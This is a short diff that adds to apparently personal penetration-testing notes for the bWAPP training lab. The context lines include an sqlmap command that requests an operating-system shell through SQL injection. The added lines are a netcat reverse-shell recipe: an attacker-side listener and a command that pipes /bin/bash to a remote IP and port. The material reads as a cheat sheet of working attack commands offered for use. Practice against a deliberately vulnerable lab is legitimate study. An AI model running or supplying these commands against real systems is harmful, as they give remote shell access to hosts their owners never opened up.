@@ -34,3 +34,13 @@ Any other useful tricks?
 How about COMMAND EXECUTION?
 sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP --os-shell
 
+
+----------
+
+nc shell
+
+----------
+
+nc -nvlp 9999 (attacker) 
+nc -nv -e /bin/bash IP PORT
+
